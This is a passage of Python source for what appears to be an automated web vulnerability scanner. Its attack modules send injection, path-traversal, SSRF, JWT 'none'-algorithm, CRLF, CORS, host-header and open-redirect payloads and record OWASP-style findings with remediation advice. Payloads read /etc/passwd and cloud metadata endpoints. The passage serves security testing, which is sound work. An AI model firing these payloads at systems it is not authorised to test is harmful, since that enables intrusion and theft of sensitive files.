                    parsed = urlparse(request.url)
                    modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params)}"
                    modified_body = None
                
                status, headers, body = await self.engine.send_modified_request(
                    session, request,
                    modified_body=modified_body,
                    modified_url=modified_url
                )
                
                for pattern in self.ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        result = AttackResult(
                            id=f"LDAPI-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="high",
                            title="LDAP Injection Detected",
                            description=f"LDAP error in parameter: {param_name}",
                            original_request_id=request.id,
                            url=request.url,
                            method=request.method,
                            parameter=param_name,
                            payload=payload,
                            evidence=f"Pattern: {pattern}",
                            remediation="Escape LDAP special characters.",
                            cwe_id="CWE-90",
                            reasoning="LDAP error in response",
                            is_post_login=is_post_login
                        )
                        self.results.append(result)
                        return self.results
        
        return self.results


# ============== XPATH INJECTION ==============

class XPathInjectionAttack(BaseAttack):
    """XPath Injection attack module"""
    
    PAYLOADS = [
        "' or '1'='1", "' or ''='", "1 or 1=1",
        "'] | //user/*[contains(*,'", "' or count(//user)>0 or '1'='1",
    ]
    
    ERROR_PATTERNS = [
        r'xpath', r'XPathException', r'invalid expression',
        r'xmlparser', r'DOMXPath',
    ]
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        if not request.parameters:
            return self.results
        
        for param_name, original_value in request.parameters.items():
            for payload in self.PAYLOADS[:3]:
                modified_params = dict(request.parameters)
                modified_params[param_name] = payload
                
                if request.method == 'POST':
                    modified_body = urlencode(modified_params)
                    modified_url = None
                else:
                    parsed = urlparse(request.url)
                    modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params)}"
                    modified_body = None
                
                status, headers, body = await self.engine.send_modified_request(
                    session, request,
                    modified_body=modified_body,
                    modified_url=modified_url
                )
                
                for pattern in self.ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        result = AttackResult(
                            id=f"XPATH-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="high",
                            title="XPath Injection Detected",
                            description=f"XPath error in parameter: {param_name}",
                            original_request_id=request.id,
                            url=request.url,
                            method=request.method,
                            parameter=param_name,
                            payload=payload,
                            evidence=f"Pattern: {pattern}",
                            remediation="Use parameterized XPath queries.",
                            cwe_id="CWE-643",
                            reasoning="XPath error in response",
                            is_post_login=is_post_login
                        )
                        self.results.append(result)
                        return self.results
        
        return self.results


# ============== IDOR ==============

class IDORAttack(BaseAttack):
    """Insecure Direct Object Reference attack module"""
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Look for numeric IDs in parameters
        id_params = {}
        for param_name, value in request.parameters.items():
            if re.match(r'^\d+$', str(value)):
                id_params[param_name] = int(value)
        
        if not id_params:
            # Also check URL path for IDs
            path_parts = urlparse(request.url).path.split('/')
            for i, part in enumerate(path_parts):
                if re.match(r'^\d+$', part):
                    id_params[f'path_{i}'] = int(part)
        
        if not id_params:
            return self.results
        
        for param_name, original_id in id_params.items():
            # Test with adjacent IDs
            for test_id in [original_id - 1, original_id + 1, 1, 0]:
                if test_id < 0 or test_id == original_id:
                    continue
                
                if param_name.startswith('path_'):
                    # Modify URL path
                    idx = int(param_name.split('_')[1])
                    path_parts = urlparse(request.url).path.split('/')
                    path_parts[idx] = str(test_id)
                    new_path = '/'.join(path_parts)
                    parsed = urlparse(request.url)
                    modified_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                    if parsed.query:
                        modified_url += f"?{parsed.query}"
                    modified_body = None
                else:
                    modified_params = dict(request.parameters)
                    modified_params[param_name] = str(test_id)
                    
                    if request.method == 'POST':
                        modified_body = urlencode(modified_params)
                        modified_url = None
                    else:
                        parsed = urlparse(request.url)
                        modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params)}"
                        modified_body = None
                
                status, headers, body = await self.engine.send_modified_request(
                    session, request,
                    modified_body=modified_body,
                    modified_url=modified_url
                )
                
                # Check if we got different user's data - requires baseline comparison
                if status == 200 and len(body) > 50:
                    # IMPORTANT: Compare with original response to detect actual IDOR
                    from core.verification import BaselineComparator
                    comparator = BaselineComparator()
                    
                    # Get original response for comparison
                    orig_status, orig_headers, orig_body = await self.engine.send_modified_request(
                        session, request
                    )
                    
                    # Analyze if this is a real IDOR
                    comparison = comparator.compare_responses(
                        baseline_status=orig_status,
                        baseline_body=orig_body,
                        baseline_headers=orig_headers or {},
                        test_status=status,
                        test_body=body,
                        test_headers=headers or {},
                        attack_type="idor"
                    )
                    
                    # Only report if we have high confidence this is real
                    if comparison.confidence >= 0.7:
                        result = AttackResult(
                            id=f"IDOR-{len(self.results)+1}",
                            category="A01:2021 - Broken Access Control",
                            severity="high",
                            title="Insecure Direct Object Reference (IDOR)",
                            description=f"Accessed other user's data with ID: {test_id}",
                            original_request_id=request.id,
                            url=request.url,
                            method=request.method,
                            parameter=param_name,
                            payload=f"ID changed from {original_id} to {test_id}",
                            evidence=f"Baseline comparison: {comparison.reasoning}. Confidence: {comparison.confidence:.0%}",
                            remediation="Implement proper authorization checks.",
                            cwe_id="CWE-639",
                            reasoning=comparison.reasoning,
                            is_post_login=is_post_login
                        )
                        self.results.append(result)
                        return self.results
        
        return self.results


# ============== BOLA (Broken Object Level Authorization) ==============

class BOLAAttack(BaseAttack):
    """Broken Object Level Authorization - API-specific IDOR"""
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Check if this looks like an API endpoint
        if '/api/' not in request.url and '/v1/' not in request.url and '/v2/' not in request.url:
            return self.results
        
        # Look for UUID or ID patterns in URL
        uuid_pattern = r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
        id_pattern = r'/(\d+)(?:/|$)'
        
        url = request.url
        
        # Test with different UUIDs
        if re.search(uuid_pattern, url):
            # Replace with different UUID
            test_uuid = "00000000-0000-0000-0000-000000000001"
            modified_url = re.sub(uuid_pattern, test_uuid, url)
            
            status, headers, body = await self.engine.send_modified_request(
                session, request,
                modified_url=modified_url
            )
            
            if status == 200 and len(body) > 50:
                # IMPORTANT: Compare with original response to detect actual BOLA
                from core.verification import BaselineComparator
                comparator = BaselineComparator()
                
                # Get original response for comparison
                orig_status, orig_headers, orig_body = await self.engine.send_modified_request(
                    session, request
                )
                
                comparison = comparator.compare_responses(
                    baseline_status=orig_status,
                    baseline_body=orig_body,
                    baseline_headers=orig_headers or {},
                    test_status=status,
                    test_body=body,
                    test_headers=headers or {},
                    attack_type="bola"
                )
                
                # Only report if we have high confidence this is real
                if comparison.confidence >= 0.7:
                    result = AttackResult(
                        id=f"BOLA-{len(self.results)+1}",
                        category="A01:2021 - Broken Access Control",
                        severity="high",
                        title="Broken Object Level Authorization (BOLA)",
                        description="API endpoint returns data for different object",
                        original_request_id=request.id,
                        url=request.url,
                        method=request.method,
                        payload=f"UUID replaced with {test_uuid}",
                        evidence=f"Baseline comparison: {comparison.reasoning}. Confidence: {comparison.confidence:.0%}",
                        remediation="Verify user owns the object before access.",
                        cwe_id="CWE-639",
                        reasoning=comparison.reasoning,
                        is_post_login=is_post_login
                    )
                    self.results.append(result)
        
        return self.results


# ============== BFLA (Broken Function Level Authorization) ==============

class BFLAAttack(BaseAttack):
    """Broken Function Level Authorization - accessing admin endpoints"""
    
    ADMIN_PATHS = [
        '/admin', '/admin/', '/admin/users', '/admin/settings',
        '/api/admin', '/api/admin/users', '/management',
        '/api/users/delete', '/api/users/update', '/api/config',
    ]
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Only test from authenticated context
        if not is_post_login:
            return self.results
        
        parsed = urlparse(request.url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Import verification utility
        from core.verification import BaselineComparator
        comparator = BaselineComparator()
        
        # Test admin paths
        for admin_path in self.ADMIN_PATHS[:5]:
            test_url = urljoin(base_url, admin_path)
            
            # First, get unauthenticated response as baseline
            unauth_headers = {k: v for k, v in request.headers.items()
                            if k.lower() not in ['authorization', 'cookie', 'x-api-key']}
            
            baseline_status, baseline_hdrs, baseline_body = await self.engine.send_modified_request(
                session, request,
                modified_url=test_url,
                modified_headers=unauth_headers
            )
            
            # Now test with auth token
            status, headers, body = await self.engine.send_modified_request(
                session, request,
                modified_url=test_url
            )
            
            # Skip if endpoint doesn't exist or both return same thing
            if status != 200:
                continue
            
            # Use baseline comparator to analyze
            comparison = comparator.compare_responses(
                baseline_status=baseline_status,
                baseline_body=baseline_body,
                baseline_headers=baseline_hdrs or {},
                test_status=status,
                test_body=body,
                test_headers=headers or {},
                attack_type="bfla"
            )
            
            # Check for actual admin content, not just 200
            if comparison.confidence >= 0.7:
                result = AttackResult(
                    id=f"BFLA-{len(self.results)+1}",
                    category="A01:2021 - Broken Access Control",
                    severity="critical",
                    title="Broken Function Level Authorization",
                    description=f"Admin endpoint accessible with regular user token: {admin_path}",
                    original_request_id=request.id,
                    url=test_url,
                    method="GET",
                    payload="Used regular user token",
                    evidence=f"BFLA analysis: {comparison.reasoning}. Confidence: {comparison.confidence:.0%}",
                    remediation="Implement role-based access control.",
                    cwe_id="CWE-285",
                    reasoning=comparison.reasoning,
                    is_post_login=is_post_login
                )
                self.results.append(result)
                return self.results
        
        return self.results


# ============== PATH TRAVERSAL ==============

class PathTraversalAttack(BaseAttack):
    """Path Traversal / Local File Inclusion attack module"""
    
    PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00",
        "....//....//....//windows/win.ini",
    ]
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Look for file/path related parameters
        file_params = [p for p in request.parameters.keys() 
                      if any(x in p.lower() for x in ['file', 'path', 'page', 'doc', 'img', 'src', 'include', 'template'])]
        
        if not file_params:
            file_params = list(request.parameters.keys())[:2]
        
        for param_name in file_params:
            for payload in self.PAYLOADS[:4]:
                modified_params = dict(request.parameters)
                modified_params[param_name] = payload
                
                if request.method == 'POST':
                    modified_body = urlencode(modified_params)
                    modified_url = None
                else:
                    parsed = urlparse(request.url)
                    modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params)}"
                    modified_body = None
                
                status, headers, body = await self.engine.send_modified_request(
                    session, request,
                    modified_body=modified_body,
                    modified_url=modified_url
                )
                
                # Check for file content indicators
                if 'root:' in body or '[fonts]' in body.lower() or 'daemon:' in body:
                    result = AttackResult(
                        id=f"LFI-{len(self.results)+1}",
                        category="A01:2021 - Broken Access Control",
                        severity="critical",
                        title="Local File Inclusion / Path Traversal",
                        description=f"File read via parameter: {param_name}",
                        original_request_id=request.id,
                        url=request.url,
                        method=request.method,
                        parameter=param_name,
                        payload=payload,
                        evidence="File content in response",
                        remediation="Validate and sanitize file paths. Use allowlists.",
                        cwe_id="CWE-22",
                        reasoning="Local file content leaked",
                        is_post_login=is_post_login
                    )
                    self.results.append(result)
                    return self.results
        
        return self.results


# ============== AUTH BYPASS ==============

class AuthBypassAttack(BaseAttack):
    """Authentication Bypass attack module"""
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Import verification utility
        from core.verification import BaselineComparator
        comparator = BaselineComparator()
        
        # Skip public endpoints - they're supposed to return 200 without auth!
        if comparator.is_public_endpoint(request.url):
            return self.results
        
        # Get original authenticated response first
        orig_status, orig_headers, orig_body = await self.engine.send_modified_request(
            session, request
        )
        
        # Test removing auth headers
        headers_without_auth = {k: v for k, v in request.headers.items()
                               if k.lower() not in ['authorization', 'cookie', 'x-api-key']}
        
        status, _, body = await self.engine.send_modified_request(
            session, request,
            modified_headers=headers_without_auth
        )
        
        # Use baseline comparison for proper verification
        is_vulnerable, confidence, reasoning = comparator.verify_auth_bypass_for_url(
            url=request.url,
            status=status,
            body=body,
            original_status=orig_status,
            original_body=orig_body
        )
        
        if is_vulnerable and confidence >= 0.7:
            result = AttackResult(
                id=f"AUTH-{len(self.results)+1}",
                category="A07:2021 - Auth Failures",
                severity="critical",
                title="Authentication Bypass",
                description="Endpoint accessible without authentication - verified with baseline comparison",
                original_request_id=request.id,
                url=request.url,
                method=request.method,
                payload="Removed auth headers",
                evidence=f"Auth bypass verified: {reasoning}. Confidence: {confidence:.0%}",
                remediation="Enforce authentication on all protected endpoints.",
                cwe_id="CWE-287",
                reasoning=reasoning,
                is_post_login=is_post_login
            )
            self.results.append(result)
        
        return self.results


# ============== JWT ATTACKS ==============

class JWTAttack(BaseAttack):
    """JWT Token attack module"""
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        if request.auth_token_type != 'jwt' or not request.auth_token_value:
            return self.results
        
        import base64
        token = request.auth_token_value
        
        # Test 1: Algorithm None attack
        try:
            parts = token.split('.')
            if len(parts) == 3:
                # Create none algorithm token
                header_none = base64.urlsafe_b64encode(
                    json.dumps({"alg": "none", "typ": "JWT"}).encode()
                ).decode().rstrip('=')
                
                payload_b64 = parts[1]
                none_token = f"{header_none}.{payload_b64}."
                
                modified_headers = dict(request.headers)
                modified_headers['Authorization'] = f'Bearer {none_token}'
                
                status, _, body = await self.engine.send_modified_request(
                    session, request,
                    modified_headers=modified_headers
                )
                
                if status == 200:
                    result = AttackResult(
                        id=f"JWT-NONE-{len(self.results)+1}",
                        category="A07:2021 - Auth Failures",
                        severity="critical",
                        title="JWT Algorithm None Attack",
                        description="Server accepts JWT with 'none' algorithm",
                        original_request_id=request.id,
                        url=request.url,
                        method=request.method,
                        payload="alg: none",
                        evidence="Token with none alg accepted",
                        remediation="Explicitly verify JWT algorithm.",
                        cwe_id="CWE-327",
                        reasoning="JWT none algorithm bypass",
                        is_post_login=is_post_login
                    )
                    self.results.append(result)
        except Exception:
            pass
        
        return self.results


# ============== SESSION ATTACKS ==============

class SessionAttack(BaseAttack):
    """Session management attack module"""
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Check for session fixation indicators
        cookie_header = request.headers.get('Cookie', '')
        set_cookie = request.headers.get('Set-Cookie', '')
        
        # Check for weak session IDs
        session_patterns = [
            (r'PHPSESSID=([a-zA-Z0-9]{20,})', 'PHPSESSID'),
            (r'JSESSIONID=([a-zA-Z0-9]{20,})', 'JSESSIONID'),
            (r'session_id=([a-zA-Z0-9]{10,})', 'session_id'),
        ]
        
        for pattern, name in session_patterns:
            match = re.search(pattern, cookie_header)
            if match:
                session_id = match.group(1)
                
                # Check if session ID is predictable (sequential, timestamp-based)
                if session_id.isdigit():
                    result = AttackResult(
                        id=f"SESSION-{len(self.results)+1}",
                        category="A07:2021 - Auth Failures",
                        severity="medium",
                        title="Predictable Session ID",
                        description=f"Session ID appears to be numeric/sequential: {name}",
                        original_request_id=request.id,
                        url=request.url,
                        method=request.method,
                        parameter=name,
                        evidence=f"Session ID: {session_id[:10]}...",
                        remediation="Use cryptographically secure random session IDs.",
                        cwe_id="CWE-330",
                        reasoning="Predictable session identifier",
                        is_post_login=is_post_login
                    )
                    self.results.append(result)
        
        return self.results


# ============== SSRF ==============

class SSRFAttack(BaseAttack):
    """Server-Side Request Forgery attack module"""
    
    PAYLOADS = [
        "http://127.0.0.1:22",
        "http://localhost:80",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://[::1]:80",
        "http://0.0.0.0:80",
        "file:///etc/passwd",
    ]
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Look for URL parameters
        url_params = [p for p in request.parameters.keys()
                     if any(x in p.lower() for x in ['url', 'uri', 'link', 'src', 'dest', 'redirect', 'fetch', 'callback'])]
        
        if not url_params:
            return self.results
        
        for param_name in url_params:
            for payload in self.PAYLOADS[:3]:
                modified_params = dict(request.parameters)
                modified_params[param_name] = payload
                
                if request.method == 'POST':
                    modified_body = urlencode(modified_params)
                    modified_url = None
                else:
                    parsed = urlparse(request.url)
                    modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params)}"
                    modified_body = None
                
                status, headers, body = await self.engine.send_modified_request(
                    session, request,
                    modified_body=modified_body,
                    modified_url=modified_url
                )
                
                # Check for SSRF indicators
                if 'root:' in body or 'ami-id' in body or 'SSH' in body or status == 200:
                    result = AttackResult(
                        id=f"SSRF-{len(self.results)+1}",
                        category="A10:2021 - SSRF",
                        severity="high",
                        title="Server-Side Request Forgery (SSRF)",
                        description=f"SSRF via parameter: {param_name}",
                        original_request_id=request.id,
                        url=request.url,
                        method=request.method,
                        parameter=param_name,
                        payload=payload,
                        evidence="Internal resource accessed",
                        remediation="Validate and sanitize URLs. Use allowlists.",
                        cwe_id="CWE-918",
                        reasoning="Internal resource accessed via SSRF",
                        is_post_login=is_post_login
                    )
                    self.results.append(result)
                    return self.results
        
        return self.results


# ============== CSRF ==============

class CSRFAttack(BaseAttack):
    """Cross-Site Request Forgery detection module"""
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Only check state-changing requests
        if request.method not in ['POST', 'PUT', 'DELETE', 'PATCH']:
            return self.results
        
        # Check for CSRF token in request
        csrf_indicators = ['csrf', 'xsrf', 'token', '_token', 'authenticity_token', 'csrfmiddlewaretoken']
        
        has_csrf = False
        for indicator in csrf_indicators:
            if indicator in request.body.lower() if request.body else False:
                has_csrf = True
                break
            if indicator in str(request.headers).lower():
                has_csrf = True
                break
        
        if not has_csrf:
            # Verify by sending without origin/referer
            headers_modified = dict(request.headers)
            headers_modified.pop('Origin', None)
            headers_modified.pop('Referer', None)
            headers_modified['Origin'] = 'https://attacker.com'
            
            status, _, body = await self.engine.send_modified_request(
                session, request,
                modified_headers=headers_modified
            )
            
            if status == 200:
                result = AttackResult(
                    id=f"CSRF-{len(self.results)+1}",
                    category="A01:2021 - Broken Access Control",
                    severity="medium",
                    title="Missing CSRF Protection",
                    description="State-changing endpoint lacks CSRF token",
                    original_request_id=request.id,
                    url=request.url,
                    method=request.method,
                    payload="Request without CSRF token",
                    evidence="Request succeeded without token",
                    remediation="Implement CSRF tokens for all state-changing requests.",
                    cwe_id="CWE-352",
                    reasoning="No CSRF protection on state-changing endpoint",
                    is_post_login=is_post_login
                )
                self.results.append(result)
        
        return self.results


# ============== HOST HEADER ==============

class HostHeaderAttack(BaseAttack):
    """Host Header Injection attack module"""
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Test with different Host headers
        evil_hosts = [
            'evil.com',
            'localhost',
            f'{urlparse(request.url).netloc}@evil.com',
        ]
        
        for evil_host in evil_hosts:
            modified_headers = dict(request.headers)
            modified_headers['Host'] = evil_host
            modified_headers['X-Forwarded-Host'] = evil_host
            
            status, resp_headers, body = await self.engine.send_modified_request(
                session, request,
                modified_headers=modified_headers
            )
            
            # Check if evil host is reflected
            if evil_host in body or evil_host in str(resp_headers):
                result = AttackResult(
                    id=f"HOST-{len(self.results)+1}",
                    category="A05:2021 - Security Misconfiguration",
                    severity="medium",
                    title="Host Header Injection",
                    description="Host header value reflected in response",
                    original_request_id=request.id,
                    url=request.url,
                    method=request.method,
                    payload=f"Host: {evil_host}",
                    evidence="Evil host reflected",
                    remediation="Validate Host header against whitelist.",
                    cwe_id="CWE-644",
                    reasoning="Injected Host header reflected in response",
                    is_post_login=is_post_login
                )
                self.results.append(result)
                return self.results
        
        return self.results


# ============== CORS ==============

class CORSAttack(BaseAttack):
    """CORS Misconfiguration attack module"""
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        evil_origins = [
            'https://evil.com',
            'null',
            f'https://{urlparse(request.url).netloc}.evil.com',
        ]
        
        for origin in evil_origins:
            modified_headers = dict(request.headers)
            modified_headers['Origin'] = origin
            
            status, resp_headers, body = await self.engine.send_modified_request(
                session, request,
                modified_headers=modified_headers
            )
            
            acao = resp_headers.get('Access-Control-Allow-Origin', '')
            acac = resp_headers.get('Access-Control-Allow-Credentials', '')
            
            if acao == origin or acao == '*':
                if acac.lower() == 'true' or acao == '*':
                    result = AttackResult(
                        id=f"CORS-{len(self.results)+1}",
                        category="A05:2021 - Security Misconfiguration",
                        severity="high" if acac.lower() == 'true' else "medium",
                        title="CORS Misconfiguration",
                        description=f"Server allows origin: {origin}",
                        original_request_id=request.id,
                        url=request.url,
                        method=request.method,
                        payload=f"Origin: {origin}",
                        evidence=f"ACAO: {acao}, ACAC: {acac}",
                        remediation="Validate origins against whitelist.",
                        cwe_id="CWE-942",
                        reasoning="Dangerous CORS configuration",
                        is_post_login=is_post_login
                    )
                    self.results.append(result)
                    return self.results
        
        return self.results


# ============== HPP ==============

class HPPAttack(BaseAttack):
    """HTTP Parameter Pollution attack module"""
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        if not request.parameters:
            return self.results
        
        # Duplicate first parameter with different value
        first_param = list(request.parameters.keys())[0]
        original_value = request.parameters[first_param]
        
        parsed = urlparse(request.url)
        
        # Create URL with duplicate parameter
        duplicate_params = f"{first_param}={original_value}&{first_param}=injected"
        if parsed.query:
            modified_query = f"{parsed.query}&{first_param}=injected"
        else:
            modified_query = duplicate_params
        
        modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{modified_query}"
        
        status, headers, body = await self.engine.send_modified_request(
            session, request,
            modified_url=modified_url
        )
        
        if 'injected' in body:
            result = AttackResult(
                id=f"HPP-{len(self.results)+1}",
                category="A03:2021 - Injection",
                severity="low",
                title="HTTP Parameter Pollution",
                description=f"Duplicate parameter processed: {first_param}",
                original_request_id=request.id,
                url=request.url,
                method=request.method,
                parameter=first_param,
                payload=duplicate_params,
                evidence="Injected value used",
                remediation="Handle duplicate parameters consistently.",
                cwe_id="CWE-235",
                reasoning="Duplicate parameter value reflected",
                is_post_login=is_post_login
            )
            self.results.append(result)
        
        return self.results


# ============== CRLF ==============

class CRLFAttack(BaseAttack):
    """CRLF Injection / HTTP Response Splitting attack module"""
    
    PAYLOADS = [
        "%0d%0aSet-Cookie:crlf=injected",
        "\r\nX-Injected: crlf",
        "%0d%0aX-Injected:%20crlf",
    ]
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        if not request.parameters:
            return self.results
        
        for param_name in list(request.parameters.keys())[:2]:
            for payload in self.PAYLOADS:
                modified_params = dict(request.parameters)
                modified_params[param_name] = request.parameters[param_name] + payload
                
                parsed = urlparse(request.url)
                modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params)}"
                
                status, resp_headers, body = await self.engine.send_modified_request(
                    session, request,
                    modified_url=modified_url
                )
                
                # Check if our header was injected
                if 'crlf' in str(resp_headers).lower() or 'X-Injected' in str(resp_headers):
                    result = AttackResult(
                        id=f"CRLF-{len(self.results)+1}",
                        category="A03:2021 - Injection",
                        severity="medium",
                        title="CRLF Injection",
                        description=f"Header injection via: {param_name}",
                        original_request_id=request.id,
                        url=request.url,
                        method=request.method,
                        parameter=param_name,
                        payload=payload,
                        evidence="Injected header present",
                        remediation="Sanitize CRLF characters in input.",
                        cwe_id="CWE-93",
                        reasoning="Header injection successful",
                        is_post_login=is_post_login
                    )
                    self.results.append(result)
                    return self.results
        
        return self.results


# ============== CACHE POISON ==============

class CachePoisonAttack(BaseAttack):
    """Web Cache Poisoning attack module"""
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Add cache buster and test with unkeyed headers
        import random
        cache_buster = f"cb={random.randint(1000, 9999)}"
        
        parsed = urlparse(request.url)
        if parsed.query:
            test_url = f"{request.url}&{cache_buster}"
        else:
            test_url = f"{request.url}?{cache_buster}"
        
        # First request with X-Forwarded-Host
        modified_headers = dict(request.headers)
        modified_headers['X-Forwarded-Host'] = 'evil.com'
        
        status1, _, body1 = await self.engine.send_modified_request(
            session, request,
            modified_url=test_url,
            modified_headers=modified_headers
        )
        
        # Second request without modified header
        status2, _, body2 = await self.engine.send_modified_request(
            session, request,
            modified_url=test_url
        )
        
        # If evil.com persists in cached response
        if 'evil.com' in body2:
            result = AttackResult(
                id=f"CACHE-{len(self.results)+1}",
                category="A05:2021 - Security Misconfiguration",
                severity="high",
                title="Web Cache Poisoning",
                description="Unkeyed header persists in cache",
                original_request_id=request.id,
                url=request.url,
                method=request.method,
                payload="X-Forwarded-Host: evil.com",
                evidence="Injected value in cached response",
                remediation="Include all headers in cache key.",
                cwe_id="CWE-444",
                reasoning="Unkeyed header cached",
                is_post_login=is_post_login
            )
            self.results.append(result)
        
        return self.results


# ============== HTTP REQUEST SMUGGLING ==============

class HTTPSmugglingAttack(BaseAttack):
    """HTTP Request Smuggling detection module"""
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # This is a detection only - actual smuggling requires raw socket
        # Check for Transfer-Encoding handling
        
        modified_headers = dict(request.headers)
        modified_headers['Transfer-Encoding'] = 'chunked'
        modified_headers['Content-Length'] = '0'
        
        # Send conflicting headers
        try:
            status, resp_headers, body = await self.engine.send_modified_request(
                session, request,
                modified_headers=modified_headers
            )
            
            # If server doesn't reject conflicting headers
            if status != 400:
                result = AttackResult(
                    id=f"SMUGGLE-{len(self.results)+1}",
                    category="A05:2021 - Security Misconfiguration",
                    severity="info",
                    title="Potential HTTP Smuggling",
                    description="Server accepts conflicting CL/TE headers",
                    original_request_id=request.id,
                    url=request.url,
                    method=request.method,
                    payload="Conflicting CL and TE headers",
                    evidence="Request not rejected",
                    remediation="Reject requests with conflicting headers.",
                    cwe_id="CWE-444",
                    reasoning="Conflicting headers accepted",
                    is_post_login=is_post_login
                )
                self.results.append(result)
        except:
            pass
        
        return self.results


# ============== OPEN REDIRECT ==============

class OpenRedirectAttack(BaseAttack):
    """Open Redirect attack module"""
    
    PAYLOADS = [
        "https://evil.com",
        "//evil.com",
        "https://evil.com%23@legitimate.com",
        "/\\evil.com",
        "https:evil.com",
    ]
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Look for redirect parameters
        redirect_params = [p for p in request.parameters.keys()
                         if any(x in p.lower() for x in ['redirect', 'url', 'next', 'return', 'goto', 'dest', 'continue'])]
        
        if not redirect_params:
            return self.results
        
        for param_name in redirect_params:
            for payload in self.PAYLOADS[:3]:
                modified_params = dict(request.parameters)
                modified_params[param_name] = payload
                
                parsed = urlparse(request.url)
                modified_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(modified_params)}"
                
                status, resp_headers, body = await self.engine.send_modified_request(
                    session, request,
                    modified_url=modified_url
                )
                
                # Check for redirect to evil domain
                location = resp_headers.get('Location', '')
                if 'evil.com' in location or status in [301, 302, 303, 307, 308]:
                    result = AttackResult(
                        id=f"REDIRECT-{len(self.results)+1}",
                        category="A01:2021 - Broken Access Control",
                        severity="medium",
                        title="Open Redirect",
                        description=f"Redirect to external domain via: {param_name}",
                        original_request_id=request.id,
                        url=request.url,
                        method=request.method,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"Location: {location[:50]}",
                        remediation="Validate redirect URLs against whitelist.",
                        cwe_id="CWE-601",
                        reasoning="Redirect to attacker domain",
                        is_post_login=is_post_login
                    )
                    self.results.append(result)
                    return self.results
        
        return self.results


# ============== FILE UPLOAD ==============

class FileUploadAttack(BaseAttack):
    """File Upload vulnerability detection module"""
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Check if this looks like a file upload endpoint
        if 'multipart' not in request.content_type.lower():
            return self.results
        
        # Look for file extension filtering bypass patterns
        # This is passive detection based on endpoint identification
        if any(x in request.url.lower() for x in ['upload', 'file', 'import', 'attachment']):
            result = AttackResult(
                id=f"UPLOAD-{len(self.results)+1}",
                category="A04:2021 - Insecure Design",
                severity="info",
                title="File Upload Endpoint Detected",
                description="Endpoint appears to handle file uploads",
                original_request_id=request.id,
                url=request.url,
                method=request.method,
                evidence="Multipart content type",
                remediation="Validate file type, size, and content. Store outside webroot.",
                cwe_id="CWE-434",
                reasoning="File upload endpoint identified for manual testing",
                is_post_login=is_post_login
            )
            self.results.append(result)
        
        return self.results


# ============== RATE LIMIT BYPASS ==============

class RateLimitBypassAttack(BaseAttack):
    """Rate Limiting bypass detection module"""
    
    async def run(self, session, request: CapturedRequest, is_post_login: bool = False) -> List[AttackResult]:
        self.results = []
        
        # Test with various headers that might bypass rate limiting
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
        ]
        
        # Send multiple rapid requests
        responses = []
        for _ in range(5):
            status, _, _ = await self.engine.send_modified_request(session, request)
            responses.append(status)
        
        # Check if we got rate limited
        if 429 not in responses:
            # Try with bypass headers
            for bypass in bypass_headers[:2]:
                modified_headers = {**dict(request.headers), **bypass}
                status, _, _ = await self.engine.send_modified_request(
                    session, request,
                    modified_headers=modified_headers
                )
                
                if status == 200:
                    result = AttackResult(
                        id=f"RATELIMIT-{len(self.results)+1}",
                        category="A04:2021 - Insecure Design",
                        severity="low",
